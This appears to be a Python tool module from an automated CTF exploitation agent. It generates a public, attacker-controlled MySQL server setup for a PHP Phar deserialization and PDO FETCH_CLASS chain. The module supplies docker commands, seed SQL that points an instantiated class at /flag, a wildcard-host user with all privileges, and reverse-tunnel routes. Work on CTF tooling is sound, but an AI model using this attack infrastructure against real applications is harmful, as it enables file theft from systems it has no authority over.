"""Plan public MySQL helper infrastructure for Web CTF exploit chains."""
from __future__ import annotations

import hashlib
import secrets
import shlex
from typing import Any, Dict

from ..base import BaseTool, ToolResult


def _q(value: str) -> str:
    return shlex.quote(str(value))


def _sq(value: str) -> str:
    return str(value).replace("'", "''")


class CTFMySQLHelperTool(BaseTool):
    category = "ctf_web"
    requires_exploit_enabled = True
    required_capability = "exploit"

    @property
    def name(self) -> str:
        return "ctf_mysql_helper"

    @property
    def description(self) -> str:
        return (
            "Generate a CTF public MySQL service plan for exploit chains that need a database "
            "reachable by the target, especially strange_php Phar deserialization + PDO FETCH_CLASS. "
            "Returns Docker/VPS commands, SQL, free public DB checklist, connectivity checks, and "
            "ready arguments for phar_pdo_chain."
        )

    def parameters_schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "scenario": {"type": "string", "enum": ["strange_php", "generic"], "description": "Default: strange_php."},
                "public_host": {"type": "string", "description": "Public VPS IP/domain or public MySQL endpoint."},
                "mysql_port": {"type": "integer", "description": "Default: 3306."},
                "db_name": {"type": "string", "description": "Default: users."},
                "db_user": {"type": "string", "description": "Default: joker."},
                "db_password": {"type": "string", "description": "Default: joker."},
                "root_password": {"type": "string", "description": "Random if omitted."},
                "flag_path": {"type": "string", "description": "Default: /flag."},
                "exploit_username": {"type": "string", "description": "User::$username and SQL username value. Default: UserMessage."},
                "container_name": {"type": "string", "description": "Default: autopenx-ctf-mysql."},
            },
            "required": [],
        }

    def _run(self, **kwargs: Any) -> ToolResult:
        scenario = str(kwargs.get("scenario") or "strange_php")
        public_host = str(kwargs.get("public_host") or "").strip()
        mysql_port = int(kwargs.get("mysql_port") or 3306)
        db_name = str(kwargs.get("db_name") or "users")
        db_user = str(kwargs.get("db_user") or "joker")
        db_password = str(kwargs.get("db_password") or "joker")
        root_password = str(kwargs.get("root_password") or secrets.token_urlsafe(12))
        flag_path = str(kwargs.get("flag_path") or "/flag")
        exploit_username = str(kwargs.get("exploit_username") or "UserMessage")
        container_name = str(kwargs.get("container_name") or "autopenx-ctf-mysql")
        host_for_args = public_host or "<your-public-mysql-host>"
        expected_log_path = "/log/" + hashlib.md5(flag_path.encode("utf-8")).hexdigest() + ".txt"

        sql = _build_strange_php_sql(
            db_name=db_name,
            db_user=db_user,
            db_password=db_password,
            flag_path=flag_path,
            exploit_username=exploit_username,
        )
        docker_run = (
            "docker run -d --name " + _q(container_name)
            + " -p " + _q(f"0.0.0.0:{mysql_port}:3306")
            + " -e MYSQL_ROOT_PASSWORD=" + _q(root_password)
            + " mysql:8.0 --default-authentication-plugin=mysql_native_password --bind-address=0.0.0.0"
        )
        init_command = "cat setup.sql | docker exec -i " + _q(container_name) + " mysql -uroot -p" + _q(root_password)
        phar_args = {
            "db_host": host_for_args,
            "db_port": mysql_port,
            "db_name": db_name,
            "db_user": db_user,
            "db_password": db_password,
            "flag_path": flag_path,
            "generate_payload": True,
        }
        checks = [
            f"mysql -h {host_for_args} -P {mysql_port} -u {db_user} -p{db_password} {db_name} -e \"select * from users;\"",
            f"nc -vz {host_for_args} {mysql_port}",
            "VPS security group/firewall must allow inbound TCP from the CTF target container.",
            "If using a free public DB, ensure it supports remote TCP MySQL and allows '%' or target IP clients.",
        ]
        free_db_checklist = [
            "Create a MySQL database named users, or change db_name to the provider database name.",
            "Create/import the generated SQL table and seed row.",
            "Whitelist remote clients if the provider requires an allowlist.",
            "Use the provider host, port, username, password as phar_pdo_chain db_* args.",
            "Prefer short-lived throwaway credentials; delete the database after the CTF solve.",
        ]
        parsed = {
            "scenario": scenario,
            "public_host": public_host,
            "mysql_port": mysql_port,
            "db_name": db_name,
            "db_user": db_user,
            "db_password": db_password,
            "root_password": root_password,
            "flag_path": flag_path,
            "exploit_username": exploit_username,
            "expected_log_path": expected_log_path,
            "docker_run": docker_run,
            "sql_setup": sql,
            "init_command": init_command,
            "connectivity_checks": checks,
            "free_db_checklist": free_db_checklist,
            "phar_pdo_chain_args": phar_args,
            "next_tool": "phar_pdo_chain",
            "next_tool_if_docker_unavailable": "ctf_tunnel_helper",
            "non_docker_routes": [
                "ngrok TCP tunnel",
                "frp reverse TCP tunnel through a VPS",
                "chisel reverse TCP tunnel through a VPS",
                "SSH reverse port forwarding",
                "bore.pub temporary TCP tunnel",
                "free public MySQL provider",
            ],
        }
        raw = "\n\n".join([
            "Docker VPS command:\n" + docker_run,
            "SQL setup:\n" + sql,
            "Load SQL:\n" + init_command,
            "Connectivity checks:\n" + "\n".join(checks),
            "Free public MySQL checklist:\n" + "\n".join("- " + item for item in free_db_checklist),
            "Docker unavailable next step:\nCall ctf_tunnel_helper with local_port=3306 and service=mysql, or use a free public MySQL provider.",
            "Next phar_pdo_chain args:\n" + str(phar_args),
            "Expected flag log:\n" + expected_log_path,
        ])
        return ToolResult(True, self.name, "Generated CTF public MySQL helper plan.", raw_output=raw, parsed_data=parsed)


def _build_strange_php_sql(*, db_name: str, db_user: str, db_password: str, flag_path: str, exploit_username: str) -> str:
    return f"""CREATE DATABASE IF NOT EXISTS `{_sq(db_name)}` DEFAULT CHARACTER SET utf8mb4;
USE `{_sq(db_name)}`;
DROP TABLE IF EXISTS users;
CREATE TABLE users (
  class_name VARCHAR(64) NOT NULL,
  username VARCHAR(128) NOT NULL,
  filePath VARCHAR(255) NOT NULL,
  password VARCHAR(255) NOT NULL
);
INSERT INTO users (class_name, username, filePath, password)
VALUES ('UserMessage', '{_sq(exploit_username)}', '{_sq(flag_path)}', 'trigger');
CREATE USER IF NOT EXISTS '{_sq(db_user)}'@'%' IDENTIFIED BY '{_sq(db_password)}';
GRANT ALL PRIVILEGES ON `{_sq(db_name)}`.* TO '{_sq(db_user)}'@'%';
FLUSH PRIVILEGES;"""
